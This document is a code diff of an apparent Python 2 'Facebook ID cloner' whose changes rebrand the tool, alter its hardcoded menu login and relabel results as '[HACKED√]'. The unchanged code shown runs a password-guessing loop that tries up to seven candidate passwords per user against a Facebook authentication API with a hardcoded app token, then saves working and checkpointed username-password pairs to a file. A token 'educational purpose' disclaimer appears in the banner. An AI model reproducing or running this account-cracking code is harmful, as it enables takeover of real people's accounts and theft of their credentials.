@@ -48,19 +48,23 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """
-\033[1;96m══▒█████████████████████████▀█████████████  \033[1;91mDWNT COPY YOUR FATHER 🦇
-\033[1;96m══▒█▄─▄─▀██▀▄─██▄─▀█▄─▄█─▄▄▄▄█▄─▄████▀▄─██  \033[1;92mAAHIL UPDATE COMMANDS 🦇
-\033[1;91m══▒██─▄─▀██─▀─███─█▄▀─██─██▄─██─██▀██─▀─██  \033[1;93mWE ARE PAKISTANIS.    🦇
-\033[1;96m══▒▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀  \033[1;94mWE ARE BLACK TIGERS.  🦇
-
-\033[1;96m══║══▒═💀═▒═💀═▒═══¤═¤═¤═════════════════════║🔥
-\033[1;96m══║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗 ☪ 𝕸𝖗.𝕽𝖆𝖓𝖆 𝕬𝖆𝖍𝖎𝖑 ║🔥
-\033[1;96m══║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ Aahil Creations ║🔥
-\033[1;96m══║✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ☪║🔥
-\033[1;96m══║══▒═💀═▒═💀═▒═══¤═¤═¤═════════════════════║🔥"""
-
-jalan("\033[1;96m▬▬▬▬▬ AGR TUM COMMANDS KI COPY KR RAHY HO ")
-jalan("\033[1;96m▬▬▬▬▬ TU US SA TUM AAHIL NI BNJAO GY ")
+\033[1;96m╭━━╮╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╭╮
+\033[1;96m┃╭╮┃╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱┃┃
+\033[1;96m┃╰╯╰┳━━┳━╮╭━━┫┃╭━━┳━╯┣━━┳━━┫╰━╮
+\033[1;96m┃╭━╮┃╭╮┃╭╮┫╭╮┃┃┃╭╮┃╭╮┃┃━┫━━┫╭╮┃
+\033[1;96m┃╰━╯┃╭╮┃┃┃┃╰╯┃╰┫╭╮┃╰╯┃┃━╋━━┃┃┃┃
+\033[1;96m╰━━━┻╯╰┻╯╰┻━╮┣━┻╯╰┻━━┻━━┻━━┻╯╰╯
+\033[1;96m╱╱╱╱╱╱╱╱╱╱╭━╯┃
+\033[1;96m╱╱╱╱╱╱╱╱╱╱╰━━╯
+\033[1;98m𝕸𝖔𝖘𝖙 𝖜𝖊𝖑𝖈𝖔𝖒𝖊 𝖙𝖔 𝕬𝖗𝖇𝖆𝖇 𝖈𝖗𝖊𝖆𝖙𝖎𝖔𝖓
+═▒═══¤═¤═¤═════════════════════
+\033[1;95m▬▬▬▬▬ ☪ 𝕬𝖗𝖇𝖆𝖇 𝕸𝖊𝖒𝖔𝖓   
+\033[1;95m▬▬▬▬▬ ☪ 𝓐𝓻𝓫𝓪𝓫 𝓒𝓻𝓮𝓪𝓽𝓲𝓸𝓷s
+\033[1;95m▬▬▬▬▬ ☪ 𝟬𝟯𝟬𝟬𝟯𝟬𝟮𝟯𝟮𝟲𝟯
+\033[1;98m𝕬𝖘𝖘𝖆𝖑𝖆𝖒-𝕬𝖑𝖆𝖎𝖐𝖚𝖒
+═▒═══¤═¤═¤═════════════════════
+jalan("\033[1;96m▬▬▬▬▬ COMMOND JUST FOR EDUCATIONAL PERPOSE  ")
+jalan("\033[1;96m▬▬▬▬▬ IT IS DEPEND UPON YOU HOW TO USE  ")
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -79,32 +83,27 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 \033[1;94m•◈••◈••◈•\033[1;94m◈••◈••◈••◈••◈•◈••◈••◈••◈••◈\033[1;94m•◈••◈••◈•
-\033[1;94m•◈••◈••◈•\033[1;95m───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄─── \033[1;94m•◈••◈••◈•
-\033[1;94m•◈••◈••◈•\033[1;95m───█▒▒░░░░░░░░░▒▒█─── \033[1;94m•◈••◈••◈•
-\033[1;94m•◈••◈••◈•\033[1;95m────█░░█░░░░░█░░█──── \033[1;94m•◈••◈••◈•
-\033[1;94m•◈••◈••◈•\033[1;95m─▄▄──█░░░▀█▀░░░█──▄▄─ \033[1;94m•◈••◈••◈•
-\033[1;94m•◈••◈••◈•\033[1;95m█░░█─▀▄░░░░░░░▄▀─█░░█ \033[1;94m•◈••◈••◈•
 \033[1;94m•◈••◈••◈•\033[1;95m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\033[1;94m•◈••◈••◈•
 \033[1;94m•◈••◈••◈•\033[1;95m█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█\033[1;94m•◈••◈••◈•
 \033[1;94m•◈••◈••◈•\033[1;95m█░░║║║╠─║─║─║║║║║╠─░░█\033[1;94m•◈••◈••◈•
 \033[1;94m•◈••◈••◈•\033[1;95m█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\033[1;94m•◈••◈••◈•
 \033[1;94m•◈••◈••◈•\033[1;95m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\033[1;94m•◈••◈••◈•
 \033[1;94m•◈••◈••◈••◈•\033[1;94m••◈••◈••◈••◈••◈••◈••◈••◈•\033[1;94m•◈••◈••◈••◈•
-\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mRanaAahil\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
-jalan('\033[1;96m▬10%')
-jalan("\033[1;96m▬▬20%")
-jalan('\033[1;96m▬▬▬30%')
-jalan('\033[1;96m▬▬▬▬40%')
-jalan("\033[1;96m▬▬▬▬▬50%")
-jalan("\033[1;96m▬▬▬▬▬▬60%    \033[1;91mBangladeshi Country ID Clone")
-jalan('\033[1;96m▬▬▬▬▬▬▬70%')
-jalan('\033[1;96m▬▬▬▬▬▬▬▬80%')
-jalan('\033[1;96m▬▬▬▬▬▬▬▬▬90%')
-jalan('\033[1;96m▬▬▬▬▬▬▬▬▬100%')
-print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mRana.Aahil\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mArbabMemon\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+jalan('\033[1;96m▬Crack10%')
+jalan("\033[1;96m▬▬Crack20%")
+jalan('\033[1;96m▬▬▬Crack30%')
+jalan('\033[1;96m▬▬▬▬Crack40%')
+jalan("\033[1;96m▬▬▬▬▬Loading50%")
+jalan("\033[1;96m▬▬▬▬▬▬Loading60%    \033[1;91mBangladesh Country ID Cloner")
+jalan('\033[1;96m▬▬▬▬▬▬▬Loading70%')
+jalan('\033[1;96m▬▬▬▬▬▬▬▬Loading80%')
+jalan('\033[1;96m▬▬▬▬▬▬▬▬▬Loading90%')
+jalan('\033[1;96m▬▬▬▬▬▬▬▬▬Proceed100%')
+print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mArbab.Memon\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "Bengal"
+CorrectPassword = "Bengal"
 
 loop = 'true'
 while (loop == 'true'):
@@ -309,7 +308,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;31mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print " \033[1;31;40m●💀════════════════════════◄🦇►════════════════════════💀●"
 
-	jalan('             \033[1;31mAahil Started Cloning  Wait...')
+	jalan('             \033[1;31mArbab Started Cloning pleaee Wait...')
 	print  "\033[1;36;40m ●💀════════════════════════◄🦇►════════════════════════💀●" 
 
 	def main(arg):
@@ -326,11 +325,11 @@ def pilih_super():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' 🦇 ' + b['name']
+				print '\x1b[1;92m[HACKED√] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' 🦇 ' + b['name']
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' 🦇 ' + b['name']
+					print '\x1b[1;36;40m[CHECKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' 🦇 ' + b['name']
 					cek = open("out/CP.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
@@ -340,11 +339,11 @@ def pilih_super():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
-						print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' 🦇 ' + b['name']
+						print '\x1b[1;92m[HACKED√] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' 🦇 ' + b['name']
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' 🦇 ' + b['name']
+							print '\x1b[1;36;40m[CHECKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' 🦇 ' + b['name']
 							cek = open("out/CP.txt", "a")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
@@ -354,11 +353,11 @@ def pilih_super():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' 🦇 ' + b['name']
+								print '\x1b[1;92m[HACKED√] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' 🦇 ' + b['name']
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' 🦇 ' + b['name']
+									print '\x1b[1;36;40m[CHACKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' 🦇 ' + b['name']
 									cek = open("out/CP.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
@@ -368,11 +367,11 @@ def pilih_super():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
-										print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' 🦇 ' + b['name']
+										print '\x1b[1;92m[HACKED√] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' 🦇 ' + b['name']
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' 🦇 ' + b['name']
+											print '\x1b[1;36;40m[CHECKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' 🦇 ' + b['name']
 											cek = open("out/CP.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
@@ -382,11 +381,11 @@ def pilih_super():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
-												print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' 🦇 ' + b['name']
+												print '\x1b[1;92m[HACKED√] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' 🦇 ' + b['name']
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' 🦇 ' + b['name']
+													print '\x1b[1;36;40m[CHECKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' 🦇 ' + b['name']
 													cek = open("out/CP.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
@@ -396,11 +395,11 @@ def pilih_super():
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
-														print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' 🦇 ' + b['name']
+														print '\x1b[1;92m[HACKED√] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' 🦇 ' + b['name']
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' 🦇 ' + b['name']
+															print '\x1b[1;36;40m[CHECKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' 🦇 ' + b['name']
 															cek = open("out/CP.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
@@ -410,11 +409,11 @@ def pilih_super():
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
-																print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' 🦇 ' + b['name']
+																print '\x1b[1;92m[HACKED√] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' 🦇 ' + b['name']
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' 🦇 ' + b['name']
+																	print '\x1b[1;36;40m[CHECKPOINT] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' 🦇 ' + b['name']
 																	cek = open("out/CP.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
